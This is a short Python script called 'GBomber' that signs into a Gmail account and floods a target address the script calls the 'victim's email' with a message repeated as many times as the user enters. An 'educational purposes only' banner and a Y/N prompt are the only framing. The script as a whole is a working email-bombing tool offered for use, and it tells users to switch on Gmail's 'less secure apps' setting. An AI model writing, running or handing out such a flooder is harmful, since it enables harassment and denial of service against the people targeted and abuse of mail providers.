#!/usr/bin/python3
import smtplib
import platform
import datetime
import os
import getpass
import sys

os.system('clear')
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
print(bcolors.OKBLUE + '''
  ____ ____                  _
 / ___| __ )  ___  _ __ ___ | |__   ___ _ __
| |  _|  _ \ / _ \| '_ ` _ \| '_ \ / _ | '__|
| |_| | |_) | (_) | | | | | | |_) |  __| |
 \____|____/ \___/|_| |_| |_|_.__/ \___|_|                  Made by sheikhjamal
 
[!] Only use this tool for educational purposes. [!]   

Make sure your gmail has less secure apps on (https://myaccount.google.com/lesssecureapps)

''' + bcolors.ENDC)

eduask   = raw_input("Only for Education Purposes? Y/N: ")
if eduask == 'Y':
		server = smtplib.SMTP('smtp.gmail.com',587)
		server.starttls()

		gmail     = raw_input("Enter Your Gmail : ")
		password  = getpass.getpass("Enter your Password:")

		if not  gmail  and not password:
				print("You must Login to your Gmail")
		else:
				server.login(gmail,password)
				print("Successfully Signed in")
				
				send = raw_input("Please enter your victim's email: ")

				print("Enter number of times you want to flood")
				countnum= int(raw_input("Count : "))
				

				msg = raw_input("Enter your message:\n")
				
				

				for count in range(int(countnum)):
					server.sendmail(gmail,send,msg)
					print (count,"Messages sent! ")



				server.quit()

else:
		print(bcolors.WARNING + "ONLY USE THIS TOOL FOR EDUCATIONAL PURPOSES!")
		print(bcolors.WARNING + "THIS TOOL WAS CREATED AND SHOULD BE FOR EDUCATION PURPOSES!")
		print(bcolors.WARNING + "I AM NOT RESPONSIBLE FOR ANYTHING YOU DO FOR THIS PROGRAM")
				


